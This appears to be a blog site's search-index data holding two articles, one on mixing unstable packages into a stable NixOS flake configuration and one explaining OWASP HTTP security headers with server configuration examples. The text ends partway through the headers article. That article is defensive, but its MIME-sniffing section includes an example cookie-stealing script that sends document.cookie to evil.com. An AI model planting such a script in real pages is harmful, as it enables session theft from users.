    "http:\/\/localhost:1313\/articles\/26062025-nixos-running-unstable-on-stable\/": {
        "title": "Mixing Unstable Packages on Stable NixOS with Flakes",
        "tags": ["NixOS","Flakes","Package Management","Home Manager","NixOS Configuration","Unstable Packages",],
        "content": "Prerequisites: Before diving into this guide, you should have a basic understanding of:\nNixOS Configuration: How to edit configuration.nix and understand basic NixOS concepts Nix Flakes: Familiarity with flake structure, inputs, and outputs Package Management: Understanding the difference between stable and unstable channels in NixOS Home Manager: Basic knowledge of Home Manager configuration (for the advanced setup section) If you\u0026rsquo;re new to these concepts, I recommend checking out the Nix Flakes Wiki and NixOS Wiki first.\nKey Terms Explained: Before you dive in, let me explain some terms you\u0026rsquo;ll encounter:\nFlakes: Nix\u0026rsquo;s new way of managing dependencies and configurations. Think of them as a standardized way to package Nix code. Inputs: The dependencies your flake needs (like different versions of nixpkgs). @inputs notation: A way to capture all inputs into a single variable for easier passing around. specialArgs: A mechanism to pass additional arguments to your NixOS configuration. legacyPackages: A flake output that gives you access to the full nixpkgs package set, just like before flakes existed. It\u0026rsquo;s used when you need things like python3Package or helper functions that don’t fit into the newer, flatter packages.${system} format. ${pkgs.system}: Returns the system architecture (like \u0026quot;x86_64-linux\u0026quot; or \u0026quot;aarch64-darwin\u0026quot;) that pkgs was instantiated with. Unlike builtins.currentSystem, it doesn’t detect the system at runtime, it just reflects the value passed when setting up the flake. Why I Needed an Unstable Package on Stable NixOS: Recently I switched from using the unstable channel of NixOS, as you guessed, I started having instability issues. I switched, back to nixos-25.05 (stable) for a smoother experience, but immediately noticed some regressions in apps I rely on, like the Nextcloud desktop client.\nStable NixOS is great for reliability, but sometimes you need just one or two packages from the bleeding edge. I didn\u0026rsquo;t want to switch my entire system back to unstable, I just wanted one newer package.\nSo I asked on the NixOS Discord, and someone kindly explained exactly what to do.\nIf you haven\u0026rsquo;t already, capture all your inputs with the @ notation like outputs = { self, nixpkgs, …}@inputs:, add specialArgs = { inherit inputs; }; to your nixosSystem call, and then add inputs to the argument list at the top of configuration.nix. Then you can install the package via environment.systemPackages = [ inputs.unstable_input_name.legacyPackages.${pkgs.system}.package_name ]; replace unstable_input_name and package_name, of course. There\u0026rsquo;s absolutely no reason all packages have to be in pkgs\nBreaking Down the Discord Advice: Let me break down each part of that advice step by step, as it can be overwhelming at first:\nStep 1: \u0026ldquo;capture all your inputs with the @ notation\u0026rdquo;\nThis means modifying your flake structure to group all inputs together:\noutputs = { self, nixpkgs, nixpkgs-unstable, ... }@inputs: The @inputs part captures all your inputs into a single variable, making them easier to pass around.\nStep 2: \u0026ldquo;add specialArgs = { inherit inputs; }; to your nixosSystem call\u0026rdquo;\nThis passes the inputs to your NixOS configuration:\nnixpkgs.lib.nixosSystem { specialArgs = { inherit inputs; }; ... } Step 3: \u0026ldquo;add inputs to the argument list at the top of configuration.nix\u0026rdquo;\nYour configuration file needs to accept the inputs parameter:\n{ config, pkgs, inputs, ... }: Step 4: \u0026ldquo;install the package via environment.systemPackages = [ inputs unstable_input_name.legacyPackages.${pkgs.system}.package_name ]\u0026rdquo;\nNow you can install unstable packages directly:\nenvironment.systemPackages = [ (inputs.nixpkgs-unstable.legacyPackages.${pkgs.system}.nextcloud-client) ]; Bonus: \u0026ldquo;There\u0026rsquo;s absolutely no reason all packages have to be in pkgs\u0026rdquo;\nThis reminds you that pkgs usually refers to your main nixpkgs input (stable), but you can use packages from any flake input, like nixpkgs-unstable.\nIn Simple Terms\nHere\u0026rsquo;s what this really means:\nYou tell Nix where to find the unstable packages, by passing inputs from the flake file into the system config. Then you make sure that info is shared with the rest of our config files, like configuration.nix or home.nix. Once that\u0026rsquo;s done, you can mix and match: keep most packages from stable, but cherry-pick a few from unstable when needed. It\u0026rsquo;s like plugging in an extra toolbox and making sure every part of your setup knows it\u0026rsquo;s there.\nMinimal Setup: Flake + configuration.nix This assumes you are using a Flake as well as just a standard configuration.nix file.\nMinimal Setup Flow Diagram: Here is what you are going to do, you are going to take the inputs from the flake.nix and pass them to the configuration.nix so you can use packages like nixpkgs-unstable inside your system config.\n┌──────────────────────────────┐ │ flake.nix │ │ │ │ inputs = { │ │ nixpkgs, │ │ nixpkgs-unstable, ←────┐ │ │ ... │ │ └────────────┬─────────────┘ │ │ │ specialArgs = { inherit inputs; } │ ▼ ┌──────────────────────────────────┐ │ configuration.nix │ │ │ │ { config, pkgs, inputs, ... } │ │ │ │ Use: │ │ inputs.nixpkgs-unstable │ │ .legacyPackages.${pkgs.system} │ └──────────────────────────────────┘ Add Unstable To Our flake.nix Inputs: First you need to add the unstable channel to your inputs like below.\n{ description = \u0026#34;NixOS config with unstable access\u0026#34;; inputs = { nixpkgs.url = \u0026#34;github:NixOS/nixpkgs/nixos-25.05\u0026#34;; # Stable nixpkgs-unstable.url = \u0026#34;github:NixOS/nixpkgs/nixos-unstable\u0026#34;; # Unstable }; ### rest of file Add specialArgs To Our Outputs: You also need to add the specialArgs to your outputs so you can pass the inputs to configuration.nix.\noutputs = { self, nixpkgs, nixpkgs-unstable, ... }@inputs: { nixosConfigurations.myhost = nixpkgs.lib.nixosSystem { system = \u0026#34;x86_64-linux\u0026#34;; specialArgs = { inherit inputs; }; # Pass inputs (like nixpkgs-unstable) to configuration.nix modules = [ ./configuration.nix ]; }; }; } Add Inputs To Our configuration.nix: Now in your configuration.nix file you need to ensure you place the inputs argument at the top.\n{ config, pkgs, inputs, ... }: Then you can easily call unstable packages using this syntax.\n(inputs.nixpkgs-unstable.legacyPackages.${pkgs.system}.packageName) Install Unstable Packages: So if you wanted to install the unstable neovim package, your configuration would look like this.\n{ config, pkgs, inputs, ... }: { environment.systemPackages = with pkgs; [ firefox (inputs.nixpkgs-unstable.legacyPackages.${pkgs.system}.neovim) #other packages... ]; } My Full Setup (Home Manager + Modular Packages) I use a separate packages.nix to keep things clean and modular. This is then imported into my home.nix which is then further called in my configuration.nix\nDiagram: As my setup is a tad more complex and modularized, here is a diagram.\n┌──────────────────────────────┐ │ flake.nix │ │ │ │ inputs = { ... │ │ nixpkgs, │ │ nixpkgs-unstable, ←────┐ │ │ ... │ │ └────────────┬─────────────┘ │ │ │ specialArgs = { inherit inputs; } │ ▼ ┌──────────────────────────────┐ │ configuration.nix │ │ │ │ { config, pkgs, inputs, ... }│ │ │ │ Use inputs.nixpkgs-unstable │ └────────────┬─────────────────┘ │ Passes to home.nix ▼ ┌──────────────────────────────┐ │ home.nix │ │ │ │ import packages.nix │ │ { inherit pkgs inputs; } │ └────────────┬─────────────────┘ │ Passes to packages.nix ▼ ┌────────────────────────────────┐ │ packages.nix │ │ │ │ Use: │ │ inputs.nixpkgs-unstable │ │ .legacyPackages.${pkgs.system} │ └────────────────────────────────┘ Pass inputs from packages.nix to home.nix: To pass through the inputs from packages.nix to my home.nix file I add the below argument.\nspecialArgs = { inherit inputs; }; Now for context, here is a snippet from my home.nix you can see I also pass through cursor the editor I use sometimes and pkgs this is due to how I have my setup configured.\n{ config, pkgs, inputs, ... }: let cursor = pkgs.callPackage ../cursor/cursor.nix { }; in { imports = [ ./modules/base.nix (import ../packages/packages.nix { inherit pkgs cursor inputs; }) ]; home.stateVersion = \u0026#34;25.05\u0026#34;; } Install Unstable Version Of nextcloud-client In packages.nix: Then to install the nextcloud-client package from unstable I place this in my packages.nix.\n{ pkgs, cursor, inputs, ... }: { home.packages = with pkgs; [ #SNIPPET # Blogging hugo # Nextcloud using unstable as better # #nextcloud-client (inputs.nixpkgs-unstable.legacyPackages.${pkgs.system}.nextcloud-client) # video vlc ffmpeg #SNIPPET ]; } Tips \u0026amp; Resources: Tips:\nAlways pass inputs explicitly when importing files that use it Use legacyPackages.${pkgs.system} to avoid flake evaluation issues This pattern works for both system and Home Manager packages Keeps your base system stable but lets you pull in just what you need Resources:\nNix Flakes - Wiki Home Manager - GitHub My dotfiles (GitHub) ",

    },

    "http:\/\/localhost:1313\/articles\/secureheaders\/": {
        "title": "Understanding OWASP Secure Headers: HTTP Security Headers \u0026 Best Practices",
        "tags": ["OWASP","Web Security","HTTP Headers","Security Headers","Content Security Policy","HSTS","CSP","X-Frame-Options","X-Content-Type-Options","Referrer-Policy","Permissions-Policy","Cache-Control","Web Application Security","Security Best Practices",],
        "content": "Introduction: The OWASP Secure Headers Project (OSHP) is a comprehensive initiative that provides guidance on implementing HTTP security headers to enhance web application security. These headers act as a crucial layer of defense, helping to prevent common web vulnerabilities and protect users from various attack vectors.\nAs penetration testers/security professionals, understanding and implementing these headers is often an essential part of remediation guidance as well as an integral part of securing our own applications and systems.\nWhat are HTTP Security Headers? HTTP security headers are response headers that instruct web browsers to enforce specific security policies. They provide defense-in-depth by controlling how browsers handle content, enforce security policies, and protect against common attack vectors such as:\nCross-Site Scripting (XSS) Clickjacking MIME type sniffing attacks Protocol downgrade attacks Cross-site request forgery (CSRF) The OWASP Secure Headers Project Mission Luckily for us OWASP have the Secure Headers Project (OSHP) which provides comprehensive guidance and configurations for helping implement these secure headers.\nhttps://owasp.org/www-project-secure-headers/ The OSHP also aims to:\nProvide comprehensive guidance on recommended HTTP security headers Identify headers that should be removed or avoided Offer validation tools for security header configurations Provide code libraries for implementation Track global usage statistics of security headers Active Security Headers: The following headers are currently active (listed as part of the OSHP project) and recommended for implementation.\nWe will break down each one to make it easier to understand what they do and how they offer protection.\nStrict-Transport-Security (HSTS) HTTP Strict Transport Security (HSTS) is a powerful response header that instructs browsers to only communicate with your site over secure HTTPS connections. This helps prevent protocol downgrade attacks and cookie hijacking.\nWhen a browser sees the HSTS header, it remembers (for a duration you define) that it must refuse any HTTP connection to your domain, even if the user manually types http://.\nHeader Values: Directive Description max-age=SECONDS Duration (in seconds) the browser should enforce HTTPS only includeSubDomains Extend the rule to all subdomains preload Request inclusion in browser preload lists (see below) Implementation Examples: # Basic HSTS (1 year duration) Strict-Transport-Security: max-age=31536000 # Include subdomains for full domain coverage Strict-Transport-Security: max-age=31536000; includeSubDomains # Recommended: full HSTS with preload flag Strict-Transport-Security: max-age=31536000; includeSubDomains; preload Security Considerations: +Important+: The HSTS header only takes effect over HTTPS. If a user visits your site via HTTP first, and you haven\u0026rsquo;t redirected them to HTTPS, the header won\u0026rsquo;t be seen or respected.\nThe preload flag can be used to submit your domain to https://hstspreload.org , allowing browsers to enforce HTTPS from the first visit—before any connection is made. Be cautious: once preloaded, removing HSTS can be difficult and slow to propagate.\nTesting HSTS Implementation: Many automated scanners (e.g., Nessus, Nikto, Burp Suite) will check for HSTS headers by default. You can also verify it manually with curl or nmap.\n# Using curl to check for the HSTS header curl -I https://example.com | grep -i strict-transport-security # Scan headers with nmap nmap --script http-security-headers -p 443 example.com See also: https://nmap.org/nsedoc/scripts/http-security-headers.html X-Frame-Options (XFO): The X-Frame-Options (XFO) header helps protect against clickjacking attacks by controlling whether your content can be embedded within an \u0026lt;iframe\u0026gt;. Without it, attackers could load your site invisibly within a frame and trick users into interacting with it unknowingly.\nAlthough still respected by many browsers, this header is largely considered legacy and is being replaced by the more flexible Content-Security-Policy: frame-ancestors.\nImplementation Options: # Deny all framing (most secure) X-Frame-Options: DENY # Allow framing by pages on the same origin X-Frame-Options: SAMEORIGIN # Allow from specific origin (deprecated and no longer supported by modern browsers) X-Frame-Options: ALLOW-FROM https://trusted-site.com +Important Note+: According to OWASP guidance:\nThe Content-Security-Policy (CSP) frame-ancestors directive obsoletes the X-Frame-Options header. If both are present, frame-ancestors takes precedence and the X-Frame-Options header will be ignored.\nModern Alternative: CSP frame-ancestors: The recommended modern approach is to use the frame-ancestors directive in your Content Security Policy. This provides greater flexibility and support for multiple trusted origins.\n# Completely disallow framing from any origin Content-Security-Policy: frame-ancestors \u0026#39;none\u0026#39;; # Allow framing only from your own domain Content-Security-Policy: frame-ancestors \u0026#39;self\u0026#39;; # Allow multiple trusted sources Content-Security-Policy: frame-ancestors \u0026#39;self\u0026#39; https://trusted-partner.com; X-Content-Type-Options: The X-Content-Type-Options header helps prevent MIME type sniffing, a technique used by some browsers to guess a file’s content type if the server-supplied Content-Type seems ambiguous.\nWhen set to nosniff, this header instructs browsers to strictly follow the Content-Type declared by the server and not try to \u0026ldquo;guess\u0026rdquo; or interpret files as a different type. This mitigates risks like executing a malicious script served with a misleading MIME type.\nX-Content-Type-Options: nosniff What Is MIME Sniffing? Browsers try to be \u0026ldquo;helpful\u0026rdquo; by sniffing the actual content of a file to determine its type, even if the server explicitly tells the browser, \u0026ldquo;Hey this is a text file.\u0026rdquo;\nFor example, if a server sends a file with Content-Type: text/plain, but the browser detects JavaScript content, some browsers might treat it as application/javascript and execute it.\nThis is where the X-Content-Type-Options: nosniff header comes in. It tells the browser: \u0026ldquo;Don’t guess. Only trust the Content-Type that I, the server, tells you.\u0026rdquo;\nAn Example Exploit Scenario (Without nosniff enabled): Say you have a website, that you allow users to upload images to like .png, .jpg etc. Now, say someone uploads a malicious JavaScript file but renames it to profile.png and your backend accepts the file and serves it with a generic or incorrect MIME type Content-Type: image/png\nHowever, as this file actually contains JavaScript what happens if X-Content-Type-Options is missing?\nWell some browsers might inspect the content of profile.png and sniff that it’s actually JavaScript, and if the file is embedded or linked in a way that allows script execution through a \u0026lt;script src=\u0026quot;...\u0026quot;\u0026gt; etc, the browser may execute the script.\nThis could lead to:\nCross-site scripting (XSS) if the malicious file is embedded in a page. Session hijacking, cookie theft, or CSRF attacks. Drive-by downloads, where a user is tricked into downloading and running malicious code just by visiting a URL. An Example of Drive-by Scenario (Without nosniff enabled): Suppose you have a document-sharing feature and host files at: https://example.com/files/user-uploaded.pdf but an attacker uploads a malicious file disguised as a PDF named invoice.pdf. And your webserver serves it as Content-Type: application/pdf\nBut its actual content is a cookie stealer like below.\n\u0026lt;script\u0026gt;fetch(\u0026#39;https://evil.com/steal?cookie=\u0026#39; + document.cookie)\u0026lt;/script\u0026gt; If X-Content-Type-Options is missing, and the user visits:\n\u0026lt;iframe src=\u0026#34;https://example.com/files/invoice.pdf\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; Some browsers may sniff the file and execute the script, turning a benign file-hosting service into a drive-by attack vector allowing attackers to steal cookies without any interaction.\nBest Practice: Always use this header, especially when serving user uploaded files or dynamic content to reduce the risk of drive-by downloads or cross-site scripting via unexpected file interpretation.\nX-Content-Type-Options: nosniff This will ensure browsers do not override the declared MIME type that is provided by the web server \u0026amp; prevent the browser from accidentally executing files as scripts.\nIt can help protect against:\nXSS from mislabeled files Drive-by downloads Content spoofing Content-Security-Policy (CSP): CSP is one of the most powerful security headers, allowing fine-grained control over resource loading and execution.\n+Important+: Testing HAS to be conducted after defining this policy, as if misconfigured it could disable inline JavaScript \u0026amp; CSS effectively disabling elements of the site. However a properly defined CSP can help prevent several different attack vectors such as cross-site scripting (XSS), click jacking and other cross-site injection attacks.\nCSP Directives Explained Directive Purpose Example base-uri Define the base URI for relative URIs \u0026lsquo;self\u0026rsquo; default-src Fallback for other directives \u0026lsquo;self\u0026rsquo; script-src Controls JavaScript sources \u0026lsquo;self\u0026rsquo; \u0026lsquo;unsafe-inline\u0026rsquo; object-src Controls allowed plugin/object/embed sources \u0026rsquo;none\u0026rsquo; style-src Controls CSS sources \u0026lsquo;self\u0026rsquo; \u0026lsquo;unsafe-inline\u0026rsquo; img-src Controls image sources \u0026lsquo;self\u0026rsquo; data: https: media-src Controls video and audio sources media.example.com frame-src (Deprecated) Controls frame sources frame.example.com child-src Controls nested browsing contexts (e.g., iframes) \u0026lsquo;self\u0026rsquo; frame-ancestors Controls where the page can be embedded (anti-clickjacking) \u0026rsquo;none\u0026rsquo; font-src Controls font sources \u0026lsquo;self\u0026rsquo; fonts.gstatic.com connect-src Controls fetch/XHR/WebSocket endpoints api.example.com manifest-src Controls manifest sources \u0026lsquo;self\u0026rsquo; form-action Restricts form submission destinations \u0026lsquo;self\u0026rsquo; sandbox Enables sandboxing of content with optional restrictions allow-scripts allow-forms script-nonce Requires script tags to have a matching nonce \u0026rsquo;nonce-abc123\u0026rsquo; plugin-types Limits allowed plugin MIME types application/pdf reflected-xss (Deprecated) Instructs browser XSS filters \u0026lsquo;block\u0026rsquo; block-all-mixed-content (Deprecated) Blocks loading of mixed (HTTP) content on HTTPS pages — upgrade-insecure-requests Instructs the browser to upgrade HTTP resources to HTTPS — referrer (Deprecated) Controls the Referer header sent no-referrer report-uri (Deprecated) Specifies where to send CSP violation reports https://example.com/csp-report report-to Defines reporting group (see Report-To header) for CSP violations default-group +Note+:\n(—) used where the directive doesn\u0026rsquo;t require a value (it\u0026rsquo;s boolean or behavior-based). Deprecated directives are marked as such but still listed for completeness. Basic CSP Implementation: Here is a basic CSP implementation example.\n# Restrictive CSP policy Content-Security-Policy: default-src \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;; style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;; img-src \u0026#39;self\u0026#39; data: https:; font-src \u0026#39;self\u0026#39;; connect-src \u0026#39;self\u0026#39;; frame-ancestors \u0026#39;none\u0026#39;; Explanation:\n'self' ensures content is loaded only from the same origin. unsafe-inline is not recommended in production, but included here for compatibility (e.g., legacy inline scripts). frame-ancestors 'none' helps mitigate clickjacking. Real-World Example: Google\u0026rsquo;s CSP. To give more context lets look at googles CSP see how a large-scale company implements CSP in production:\ncurl -I https://google.com | grep -i content-security-policy It returns something like (I say something like as the nonce value is generated per-request)\ncontent-security-policy-report-only: object-src \u0026#39;none\u0026#39;; base-uri \u0026#39;self\u0026#39;; script-src \u0026#39;nonce-yxMLgEOc8rmGppxMx2uhMw\u0026#39; \u0026#39;strict-dynamic\u0026#39; \u0026#39;report-sample\u0026#39; \u0026#39;unsafe-eval\u0026#39; \u0026#39;unsafe-inline\u0026#39; https: http:; report-uri https://csp.withgoogle.com/csp/gws/other-hp What Google\u0026rsquo;s CSP is doing:\nreport-only: This means the policy is not enforced, but violations are reported. Useful for testing. object-src 'none': Disables plugins like Flash or Java (rarely used today, but still blocked explicitly). base-uri 'self': Prevents attackers from changing the base URL and tricking relative paths. script-src breakdown: nonce-...: Allows only scripts with a matching nonce (random value generated per request). strict-dynamic: Works with nonces and ignores sources unless explicitly trusted. report-sample, unsafe-inline, unsafe-eval: Allows reporting of inline script samples, while still allowing some inline scripts, likely for backward compatibility or A/B testing. https: http:: Scripts can be loaded from any HTTPS or HTTP origin (still quite permissive). report-uri: Violations are sent to Google\u0026rsquo;s own CSP reporting endpoint. Google uses Content-Security-Policy-Report-Only to monitor violations without blocking content, which is common in complex sites with dynamic script generation. Their use of nonces and strict-dynamic is a modern best practice, as it allows precise control over which scripts execute, without the need for whitelisting entire domains. The presence of unsafe-inline and unsafe-eval shows the tension between security and compatibility. However, Google is collecting violation data while working toward tighter enforcement. CSP Testing and Validation: You can view, as you have seen the CSP for a site by curling and grepping for the source, however you can also check a CSP before implemenation by using https://csp-evaluator.withgoogle.com # Test CSP headers curl -I https://google.com | grep -i content-security-policy # Validate CSP policy online # Visit: https://csp-evaluator.withgoogle.com/ X-Permitted-Cross-Domain-Policies: The X-Permitted-Cross-Domain-Policies header tells clients, primarily legacy technologies like Adobe Flash and Adobe Acrobat how to handle cross-domain data loading via the crossdomain.xml policy file.\nAlthough Flash is now deprecated, this header still plays a role in securing environments where older clients, browser plugins, or embedded PDF viewers may be in use.\nImplementation Options: # Most secure: completely disallow all cross-domain policy files X-Permitted-Cross-Domain-Policies: none # Allow only the policy file located at the root (/crossdomain.xml) X-Permitted-Cross-Domain-Policies: master-only # Allow any cross-domain policy file (least secure; strongly discouraged) X-Permitted-Cross-Domain-Policies: all # Allow loading policy files by content type (legacy and rarely used) X-Permitted-Cross-Domain-Policies: by-content-type # Allow loading policy files via specific FTP filenames (very niche) X-Permitted-Cross-Domain-Policies: by-ftp-filename Security Considerations: +Important+: This header is mainly relevant in older ecosystems, but still contributes to a strong defense-in-depth posture, especially if you\u0026rsquo;re serving documents or files that may be opened in legacy contexts.\nUse none unless you have a clear, legacy-driven requirement. Avoid all, by-content-type, or by-ftp-filename, as these increase attack surface by allowing overly permissive policy file access. Testing Implementation: You can validate the presence of this header using command-line tools:\n# Check for the header in server responses curl -I https://example.com | grep -i x-permitted-cross-domain-policies # Use nmap to scan for security headers nmap --script http-security-headers -p 443 example.com https://nmap.org/nsedoc/scripts/http-security-headers.html Referrer-Policy: The Referrer-Policy header controls how much referrer information is included in outbound HTTP requests, such as when a user clicks a link or loads an image or script from another site.\nBy default, browsers may send the full URL of the referring page, which can expose sensitive data in query strings (e.g. /reset-password?token=xyz). This header helps mitigate that risk by letting you restrict how much information gets shared, especially in cross-origin contexts.\nPolicy Options: Policy Same-Origin Requests Cross-Origin Requests Notes unsafe-url Full URL Full URL Least private; exposes everything origin Origin only Origin only Safer; hides path/query details strict-origin Origin only Origin only (if HTTPS) Strips referrer unless HTTPS → HTTPS strict-origin-when-cross-origin Full URL Origin only (if HTTPS) Good balance; default in modern browsers no-referrer No referrer No referrer Most secure and private # Example: Send full referrer (not recommended) Referrer-Policy: unsafe-url # Example: Send no referrer at all Referrer-Policy: no-referrer # Example: Recommended default Referrer-Policy: strict-origin-when-cross-origin +Best Practice+: strict-origin-when-cross-origin is widely considered the safest default as it sends full referrer to your own site, but only the origin to third-party domains, and never leaks anything when moving from HTTPS to HTTP.\nClear-Site-Data: The Clear-Site-Data header instructs the browser to delete certain types of locally stored data when it receives the header in an HTTPS response. This can be useful after logout, user account deletion, or major application updates to prevent stale or sensitive data from lingering in the browser.\nThis header only works over secure connections (HTTPS) and is supported in most modern browsers.\nExample: Clear-Site-Data: \u0026#34;cache\u0026#34;, \u0026#34;cookies\u0026#34;, \u0026#34;storage\u0026#34; This example clears:\ncache: HTTP disk and memory caches cookies: Cookies associated with the origin storage: Persistent storage (e.g. localStorage, IndexedDB, service workers) Available Directives: Directive Description \u0026quot;cache\u0026quot; Clears the browser\u0026rsquo;s cache for the origin \u0026quot;cookies\u0026quot; Deletes cookies for the origin \u0026quot;storage\u0026quot; Clears localStorage, sessionStorage, IndexedDB, serviceWorker \u0026quot;executionContexts\u0026quot; Resets JS execution contexts (rarely used) \u0026quot;*\u0026quot; Clears all data types listed above (wildcard) Use Cases: Clearing user data after logout or account deletion. Resetting site state after a security incident or bug. Preventing old cached scripts/styles from interfering after deployment. +Important+: This header is non-blocking as it instructs the browser to delete data after the response is received. If you need to revoke tokens or end sessions immediately, combine this with server-side logic.\nCross-Origin Headers: These headers are designed to control how your site interacts with resources across different origins. They help enforce isolation, resource sharing policies, and protect against side-channel attacks, such as Spectre.\nTogether, they form part of what\u0026rsquo;s known as a \u0026ldquo;secure cross-origin isolation policy\u0026rdquo; when used correctly.\nCross-Origin-Embedder-Policy (COEP): The Cross-Origin-Embedder-Policy header determines whether your document can load cross-origin resources like images, scripts, or iframes. When set to require-corp, it blocks all cross-origin resources unless they explicitly grant permission via CORS or Cross-Origin-Resource-Policy.\nCross-Origin-Embedder-Policy: require-corp Cross-Origin-Opener-Policy (COOP): The Cross-Origin-Opener-Policy header isolates your document from other browsing contexts. This prevents other tabs or windows (even from the same origin) from accessing your context unless they meet specific criteria.\nThis is crucial for protecting window.opener references and enabling secure performance isolation.\nCross-Origin-Opener-Policy: same-origin Cross-Origin-Resource-Policy (CORP): The Cross-Origin-Resource-Policy header allows resources to opt-in to cross-origin requests. This is typically used on the resource side (e.g., APIs, fonts, images) to declare where the resource is allowed to be embedded.\nCross-Origin-Resource-Policy: same-origin Comparison Table: Header Purpose Typical Value Applied To Cross-Origin-Embedder-Policy Controls which cross-origin resources can be embedded require-corp HTML documents Cross-Origin-Opener-Policy Isolates tabs/windows to prevent shared browsing contexts same-origin HTML documents Cross-Origin-Resource-Policy Declares who can embed or fetch a resource same-origin, cross-origin, same-site Fonts, scripts, images Use Case: Enabling Cross-Origin Isolation To enable cross-origin isolation, which is required for advanced browser features like SharedArrayBuffer, you must set both COEP and COOP:\nCross-Origin-Embedder-Policy: require-corp Cross-Origin-Opener-Policy: same-origin This setup ensures your page is isolated from other browsing contexts and can safely use high resolution timers and other powerful APIs.\nPermissions-Policy: The Permissions-Policy header (formerly Feature-Policy) lets you control which browser features, APIs, and sensors are allowed to be used in your site, or in embedded content like iframes.\nThis is useful for hardening security, reducing unnecessary attack surface, and improving privacy (e.g., disabling camera/microphone access).\nIn this example, geolocation, microphone, and camera access are disabled for all origins, including the page’s own origin.\nPermissions-Policy: geolocation=(), microphone=(), camera=() Restrict in iframes only:\nPermissions-Policy: camera=(self), microphone=(self) This allows the main origin to access the APIs, but blocks them in any embedded iframe.\nCommon Directives: Feature Description geolocation Access to location data microphone Microphone access (e.g., WebRTC) camera Camera access fullscreen Allow fullscreen API usage payment Payment Request API usb WebUSB API vibrate Access to vibration feature (mostly mobile) +Tip+: Use this policy to limit powerful browser APIs to trusted origins only, especially in dynamic content or third-party embeds.\nCache-Control: The Cache-Control header defines how, and for how long, browsers and intermediaries (like CDNs or proxies) cache responses.\nThis plays a major role in both performance optimization and security, especially for sensitive content like authenticated pages or API responses.\nCommon Directives: Directive Description no-store Never store this response (e.g., for sensitive content) no-cache Validate with server before using cached version private Cache only in user\u0026rsquo;s browser, not shared caches public Can be cached by any cache (browser, CDN, proxy) max-age=SECONDS Maximum time a resource is considered fresh (in seconds) must-revalidate Must revalidate with server once expired Examples: # Prevent any caching (good for sensitive responses like logout) Cache-Control: no-store # Cache for 10 minutes in browser only Cache-Control: private, max-age=600 # Allow CDN/proxies to cache for 1 day Cache-Control: public, max-age=86400 +Security Tip+: Use no-store for any page or endpoint that handles authentication, personal data, tokens, or logout to avoid sensitive data being cached locally or by proxies.\nDeprecated Headers: The following headers are deprecated and should not be used:\nX-XSS-Protection +Deprecated+: Modern browsers have deprecated this header in favor of CSP.\n# Do NOT use this header X-XSS-Protection: 1; mode=block Feature-Policy: +Deprecated+: Replaced by Permissions-Policy.\n# Do NOT use this header Feature-Policy: geolocation \u0026#39;self\u0026#39; Public-Key-Pins (HPKP) +Deprecated+: Replaced by Certificate Transparency and modern TLS features.\n# Do NOT use this header Public-Key-Pins: max-age=2592000; pin-sha256=\u0026#34;...\u0026#34;; Implementation Guide: These examples and guides will need to be altered and modified depending on your environment. They are purely illustrative and serve as a flexible framework to follow when implementing secure headers.\nApache Configuration: # Add to .htaccess or server configuration Header always set Strict-Transport-Security \u0026#34;max-age=31536000; includeSubDomains; preload\u0026#34; Header always set X-Frame-Options \u0026#34;DENY\u0026#34; Header always set X-Content-Type-Options \u0026#34;nosniff\u0026#34; Header always set Referrer-Policy \u0026#34;strict-origin-when-cross-origin\u0026#34; Header always set Permissions-Policy \u0026#34;geolocation=(), microphone=(), camera=()\u0026#34; Header always set Content-Security-Policy \u0026#34;default-src \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;; style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;; img-src \u0026#39;self\u0026#39; data: https:; font-src \u0026#39;self\u0026#39;; connect-src \u0026#39;self\u0026#39;; frame-ancestors \u0026#39;none\u0026#39;\u0026#34; Nginx Configuration: # Add to server block add_header Strict-Transport-Security \u0026#34;max-age=31536000; includeSubDomains; preload\u0026#34; always; add_header X-Frame-Options \u0026#34;DENY\u0026#34; always; add_header X-Content-Type-Options \u0026#34;nosniff\u0026#34; always; add_header Referrer-Policy \u0026#34;strict-origin-when-cross-origin\u0026#34; always; add_header Permissions-Policy \u0026#34;geolocation=(), microphone=(), camera=()\u0026#34; always; add_header Content-Security-Policy \u0026#34;default-src \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;; style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;; img-src \u0026#39;self\u0026#39; data: https:; font-src \u0026#39;self\u0026#39;; connect-src \u0026#39;self\u0026#39;; frame-ancestors \u0026#39;none\u0026#39;\u0026#34; always; Node.js/Express Implementation: const helmet = require(\u0026#39;helmet\u0026#39;); app.use(helmet({ contentSecurityPolicy: { directives: { defaultSrc: [\u0026#34;\u0026#39;self\u0026#39;\u0026#34;], scriptSrc: [\u0026#34;\u0026#39;self\u0026#39;\u0026#34;, \u0026#34;\u0026#39;unsafe-inline\u0026#39;\u0026#34;], styleSrc: [\u0026#34;\u0026#39;self\u0026#39;\u0026#34;, \u0026#34;\u0026#39;unsafe-inline\u0026#39;\u0026#34;], imgSrc: [\u0026#34;\u0026#39;self\u0026#39;\u0026#34;, \u0026#34;data:\u0026#34;, \u0026#34;https:\u0026#34;], fontSrc: [\u0026#34;\u0026#39;self\u0026#39;\u0026#34;], connectSrc: [\u0026#34;\u0026#39;self\u0026#39;\u0026#34;], frameAncestors: [\u0026#34;\u0026#39;none\u0026#39;\u0026#34;] } }, hsts: { maxAge: 31536000, includeSubDomains: true, preload: true }, referrerPolicy: { policy: \u0026#39;strict-origin-when-cross-origin\u0026#39; }, permissionsPolicy: { features: { geolocation: [], microphone: [], camera: [] } } })); Python/Flask Implementation: from flask import Flask from flask_talisman import Talisman app = Flask(__name__) csp = { \u0026#39;default-src\u0026#39;: [\u0026#34;\u0026#39;self\u0026#39;\u0026#34;], \u0026#39;script-src\u0026#39;: [\u0026#34;\u0026#39;self\u0026#39;\u0026#34;, \u0026#34;\u0026#39;unsafe-inline\u0026#39;\u0026#34;], \u0026#39;style-src\u0026#39;: [\u0026#34;\u0026#39;self\u0026#39;\u0026#34;, \u0026#34;\u0026#39;unsafe-inline\u0026#39;\u0026#34;], \u0026#39;img-src\u0026#39;: [\u0026#34;\u0026#39;self\u0026#39;\u0026#34;, \u0026#34;data:\u0026#34;, \u0026#34;https:\u0026#34;], \u0026#39;font-src\u0026#39;: 